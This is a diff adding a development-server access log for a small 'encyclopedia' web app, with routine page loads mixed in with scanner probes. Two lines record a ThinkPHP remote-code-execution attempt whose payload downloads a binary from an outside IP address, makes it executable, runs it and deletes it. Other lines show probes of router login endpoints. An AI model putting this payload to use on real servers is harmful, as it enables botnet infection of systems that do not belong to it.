@@ -1,0 +1,41 @@
+[02/Jun/2023 20:02:28] "GET / HTTP/1.1" 200 2210
+Not Found: /favicon.ico
+[02/Jun/2023 20:26:50] "GET / HTTP/1.1" 200 2210
+Not Found: /robots.txt
+[02/Jun/2023 20:43:32] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+Not Found: /sitemap.xml
+[02/Jun/2023 20:46:45] "GET / HTTP/1.0" 200 2210
+Not Found: /.well-known/security.txt
+[02/Jun/2023 21:05:59] "GET / HTTP/1.1" 200 2210
+Not Found: /favicon.ico
+[02/Jun/2023 21:07:52,905] - Broken pipe from ('167.94.146.60', 53966)
+Not Found: /boaform/admin/formLogin
+[02/Jun/2023 21:07:54] "GET / HTTP/1.1" 200 2210
+Not Found: /HNAP1/
+[02/Jun/2023 21:07:54] "GET / HTTP/1.1" 200 2210
+[02/Jun/2023 21:07:55] code 505, message Invalid HTTP version (2.0)
+[02/Jun/2023 21:15:23] "GET / HTTP/1.1" 200 2210
+[02/Jun/2023 21:20:48] "GET / HTTP/1.1" 200 2210
+[02/Jun/2023 21:22:36] "GET / HTTP/1.1" 200 2210
+[02/Jun/2023 21:23:37] "GET / HTTP/1.1" 200 2210
+[02/Jun/2023 21:25:05] "GET /favicon.ico HTTP/1.1" 404 3130
+[02/Jun/2023 21:25:05] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[02/Jun/2023 21:25:05] "GET /robots.txt HTTP/1.1" 404 3127
+[02/Jun/2023 21:25:05] "GET /sitemap.xml HTTP/1.1" 404 3130
+[02/Jun/2023 21:25:05] "GET /.well-known/security.txt HTTP/1.1" 404 3169
+[02/Jun/2023 21:25:05] "GET /favicon.ico HTTP/1.1" 404 3130
+[02/Jun/2023 21:25:05,774] - Broken pipe from ('167.94.146.60', 40946)
+[02/Jun/2023 21:25:05] "POST /boaform/admin/formLogin HTTP/1.1" 404 3170
+[02/Jun/2023 21:25:05] "POST /HNAP1/ HTTP/1.1" 404 3119
+[02/Jun/2023 21:25:05] "PRI * HTTP/2.0" 505 -
+[02/Jun/2023 21:25:05,809] - Broken pipe from ('192.168.0.1', 50039)
+[02/Jun/2023 21:25:05,817] - Broken pipe from ('211.105.48.119', 61995)
+[02/Jun/2023 21:25:05] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[02/Jun/2023 21:25:05] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[02/Jun/2023 21:25:05,846] - Broken pipe from ('167.94.146.60', 54450)
+[02/Jun/2023 21:25:05,863] - Broken pipe from ('192.168.0.1', 51330)
+Not Found: /favicon.ico
+[02/Jun/2023 21:25:05] "GET /favicon.ico HTTP/1.1" 404 3130
+[02/Jun/2023 21:25:06] "GET / HTTP/1.1" 200 2210
+[02/Jun/2023 21:25:06] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[02/Jun/2023 21:25:08,810] - Broken pipe from ('95.214.27.201', 46342)
